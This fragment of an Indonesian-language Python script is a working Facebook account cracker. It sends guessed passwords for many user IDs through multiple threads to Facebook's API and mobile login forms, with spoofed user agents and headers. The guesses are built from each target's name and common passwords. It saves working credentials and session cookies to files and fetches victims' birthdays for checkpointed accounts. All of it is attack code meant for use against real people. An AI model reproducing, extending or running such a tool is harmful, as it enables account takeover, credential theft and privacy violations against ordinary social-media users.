	elif len(pwek)<=5:
		exit(" %s\x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mmasukan sandi minimal 6 angka\x1b[1;97m!"%(M))
	print("\n \x1b[1;92m[ \x1b[1;93mpilih method version \x1b[1;97m- \x1b[1;93msilahkan coba satu\x1b[1;97m² \x1b[1;92m]\n")
	print(" \x1b[1;92m[\x1b[1;93m1\x1b[1;92m]\x1b[1;97m. \x1b[1;93mmethod API \x1b[1;92m(\x1b[1;97mfast\x1b[1;92m)")
	print(" \x1b[1;92m[\x1b[1;93m2\x1b[1;92m]\x1b[1;97m. \x1b[1;93mmethod mbasic \x1b[1;92m(\x1b[1;97mslow\x1b[1;92m)")
	print(" \x1b[1;92m[\x1b[1;93m3\x1b[1;92m]\x1b[1;97m. \x1b[1;93mmethod mobile \x1b[1;92m(\x1b[1;97msuper slow\x1b[1;92m)")
	ask=raw_input("\n \x1b[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mmethod \x1b[1;97m: \x1b[1;92m")
	if ask=="":
		exit(" %s\x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93misi jawaban dengan benar\x1b[1;97m!"%(M))
	elif ask=="1":
		print('\n \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mhasil OK disimpan ke \x1b[1;97m-> \x1b[1;92mOK/%s.txt' % (tanggal))
		print(' \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;92mhasil CP disimpan ke \x1b[1;97m-> \x1b[1;93mCP/%s.txt' % (tanggal))
		print('\n \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93manda bisa mematikan data selular untuk menjeda proses crack\n')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				fall.submit(api, uid, pwek.split(","))
		exit("\n\n \x1b[1;92m[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mcrack selesai\x1b[1;97m...")
	elif ask=="2":
		print('\n \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mhasil OK disimpan ke \x1b[1;97m-> \x1b[1;92mOK/%s.txt' % (tanggal))
		print(' \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;92mhasil CP disimpan ke \x1b[1;97m-> \x1b[1;93mCP/%s.txt' % (tanggal))
		print('\n \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93manda bisa mematikan data selular untuk menjeda proses crack\n')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				fall.submit(mfbasic, uid, pwek.split(","),"https://mbasic.facebook.com")
		exit("\n\n \x1b[1;92m[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mcrack selesai\x1b[1;97m...")
	elif ask=="3":
		print('\n \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mhasil OK disimpan ke \x1b[1;97m-> \x1b[1;92mOK/%s.txt' % (tanggal))
		print(' \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;92mhasil CP disimpan ke \x1b[1;97m-> \x1b[1;93mCP/%s.txt' % (tanggal))
		print('\n \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93manda bisa mematikan data selular untuk menjeda proses crack\n')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				fall.submit(mfbasic, uid, pwek.split(","),"https://m.facebook.com")
		exit("\n\n \x1b[1;92m[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mcrack selesai\x1b[1;97m...")
	
def sandiotomatis():
	print("\n \x1b[1;92m[ \x1b[1;93mpilih method version \x1b[1;97m- \x1b[1;93msilahkan coba satu\x1b[1;97m² \x1b[1;92m]\n")
	print(" \x1b[1;92m[\x1b[1;93m1\x1b[1;92m]\x1b[1;97m. \x1b[1;93mmethod API \x1b[1;92m(\x1b[1;97mfast\x1b[1;92m)")
	print(" \x1b[1;92m[\x1b[1;93m2\x1b[1;92m]\x1b[1;97m. \x1b[1;93mmethod mbasic \x1b[1;92m(\x1b[1;97mslow\x1b[1;92m)")
	print(" \x1b[1;92m[\x1b[1;93m3\x1b[1;92m]\x1b[1;97m. \x1b[1;93mmethod mobile \x1b[1;92m(\x1b[1;97msuper slow\x1b[1;92m)")
	ask=raw_input("\n \x1b[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mmethod \x1b[1;97m: \x1b[1;92m")
	if ask=="":
		exit(" %s\x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93misi jawaban dengan benar\x1b[1;97m!"%(M))
	elif ask=="1":
		print('\n \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mhasil OK disimpan ke \x1b[1;97m-> \x1b[1;92mOK/%s.txt' % (tanggal))
		print(' \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;92mhasil CP disimpan ke \x1b[1;97m-> \x1b[1;93mCP/%s.txt' % (tanggal))
		print('\n \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93manda bisa mematikan data selular untuk menjeda proses crack\n')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5:
					pwx = [name, nam[0]+"123","123456","12345678","1234567","181104", nam[0]+"12345","sayang","kontol","bismillah","rahasia","anjing","akusayangkamu"]
				else:
					pwx = [name, nam[0]+"123","123456","12345678","1234567","181104", nam[0]+"12345","sayang","kontol","bismillah","rahasia","anjing","akusayangkamu"]
				fall.submit(api, uid, pwx)
		exit("\n\n \x1b[1;92m[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mcrack selesai\x1b[1;97m...")
	elif ask=="2":
		print('\n \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mhasil OK disimpan ke \x1b[1;97m-> \x1b[1;92mOK/%s.txt' % (tanggal))
		print(' \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;92mhasil CP disimpan ke \x1b[1;97m-> \x1b[1;93mCP/%s.txt' % (tanggal))
		print('\n \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93manda bisa mematikan data selular untuk menjeda proses crack\n')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5:
					pwx = [name, nam[0]+"123","123456","12345678","1234567","181104", nam[0]+"12345","sayang","kontol","bismillah","rahasia","anjing","akusayangkamu"]
				else:
					pwx = [name, nam[0]+"123","123456","12345678","1234567","181104", nam[0]+"12345","sayang","kontol","bismillah","rahasia","anjing","akusayangkamu"]
				fall.submit(mfbasic, uid, pwx,"https://mbasic.facebook.com")
		exit("\n\n \x1b[1;92m[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mcrack selesai\x1b[1;97m...")
	elif ask=="3":
		print('\n \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mhasil OK disimpan ke \x1b[1;97m-> \x1b[1;92mOK/%s.txt' % (tanggal))
		print(' \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;92mhasil CP disimpan ke \x1b[1;97m-> \x1b[1;93mCP/%s.txt' % (tanggal))
		print('\n \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] anda bisa mematikan data selular untuk menjeda proses crack\n')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5:
					pwx = [name, nam[0]+"123","123456","12345678","1234567","181104", nam[0]+"12345","sayang","kontol","bismillah","rahasia","anjing","akusayangkamu"]
				else:
					pwx = [name, nam[0]+"123","123456","12345678","1234567","181104", nam[0]+"12345","sayang","kontol","bismillah","rahasia","anjing","akusayangkamu"]
				fall.submit(mfbasic, uid, pwx,"https://m.facebook.com")
		exit("\n\n \x1b[1;92m[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mcrack selesai\x1b[1;97m...")
		
### BAGIAN CRACK ###
def api(uid, pwx):
	global ok, cp, loop, token
	sys.stdout.write(
		"\r %s\x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;92m[\x1b[1;93mndrii\x1b[1;92m] %s/%s OK:-%s - CP:-%s "%(N,loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	for pw in pwx:
		pw = pw.lower()
		ua = random.choice(['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.11','nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'])
		headers = ({
			'Authorization': 'OAuth 350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
			'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)),
			'x-fb-sim-hni': str(random.randint(20000, 40000)),
			'x-fb-net-hni': str(random.randint(20000, 40000)),
			'x-fb-connection-quality': 'EXCELLENT',
			'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
			'content-type': 'application/x-www-form-urlencoded',
			'user-agent': ua,
			'x-fb-http-engine': 'Liger'
		})
		params = {
			'format': 'JSON',
			'sdk_version': '2',
			'email': str(uid),
			'locale': 'en_US',
			'password': str(pw),
			'sdk': 'ios',
			'generate_session_cookies': '1',
			'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
		}
		status_masuk = requests.get("https://b-api.facebook.com/method/auth.login",headers=headers,params=params) 
		file_jason = json.loads(status_masuk.text)
		if "Calls to this api have exceeded the rate limit. (613)" in file_jason:
			t=15
			while t:
				mins, secs = divmod(t, 60)
				sys.stdout.write("\r %s\x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93maktifkan mode pesawat selama 5 detik%s"%(M,N))
				sys.stdout.flush()
				sleep(1.5)
				t -= 1
		elif "session_key" in status_masuk.text and "EAAA" in status_masuk.text:
			print("\r  %s* --> %s|%s|%s"%(H,uid, pw, send.json()["access_token"]))
			ok.append("%s|%s"%(uid, pw))
			open("OK/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))
			break
		elif "User must verify their account on www.facebook.com (405)" in status_masuk.text:
			try:
				token=open("token.txt","r").read()
				ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
				month, day, year = ttl.split("/")
				month = bulan[month]
				print("\r  %s* --> %s|%s|%s %s %s"%(K,uid, pw, day, month, year))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tanggal),"a").write("  * --> %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
				break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			print("\r  %s* --> %s|%s         "%(K,uid, pw))
			cp.append("%s|%s"%(uid, pw))
			open("CP/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1
	
def mfbasic(uid, pwx,url,**data):
	global ok, cp, loop, token
	sys.stdout.write(
		"\r %s\x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;92m[\x1b[1;93mndrii\x1b[1;92m] %s/%s OK:-%s - CP:-%s "%(N,loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	for pw in pwx:
		pw = pw.lower()
		ua = random.choice(['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.11','nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'])
		ge=s.get(url+"/login/?next&ref=dbl&refid=8").text
		sop=parser(ge,"html.parser")
		for i in sop.find_all("raw_input"):
			if i.get("name")==None or "_fb_noscript" in i.get("name") or "sign_up" in i.get("name"):continue
			else:data.update({i.get("name"):i.get("value")})
		data.update({"email":uid,"pass":pw})
		log_in=url+sop.find("form",method="post").get("action")
		if "m.facebook.com" in url:
			s.headers.update({"Host":re.findall("//(.+)",url)[0],"x-fb-lsd":data.get("lsd"),"content-type":"application/x-www-form-urlencoded","accept":"*/*","user-agent":ua,"referer":url+"/login/?next&ref=dbl&fl&refid=8","origin":url,"accept-encoding":"gzip, deflate","accept-language":"id-ID,en-US;q=0.9"})
		else:
			if "mbasic.facebook.com" in url:
				hea="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"
			else:
				hea="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
		s.headers.update({"Host":re.findall("//(.+)",url)[0],"sec-fetch-user":"?1","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","cache-control":"max-age=0","accept":hea,"origin":url,"user-agent":ua,"referer":url+"/login/?next&ref=dbl&fl&refid=8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
		po=s.post(log_in,data=data)
		if "c_user" in s.cookies.get_dict().keys():
			kukis = ";".join([e+"="+v for e,v in s.cookies.get_dict().items()])
			print("\r  %s* --> %s|%s|%s"%(H,uid, pw, kukis))
			ok.append("%s|%s"%(uid, pw))
			open("OK/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))
			break
		elif "checkpoint" in s.cookies.get_dict().keys():
			try:
				token=open("token.txt","r").read()
				ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
				month, day, year = ttl.split("/")
				month = bulan[month]
				print("\r  %s* --> %s|%s|%s %s %s"%(K,uid, pw, day, month, year))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tanggal),"a").write("  * --> %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
				break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			print("\r  %s* --> %s|%s         "%(K,uid, pw))
			cp.append("%s|%s"%(uid, pw))
			open("CP/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1

def buatfolder():
	try:os.mkdir("CP")
	except:pass
	try:os.mkdir("OK")
	except:pass

if __name__ == '__main__':
	os.system("git pull")
	buatfolder()
	menu()
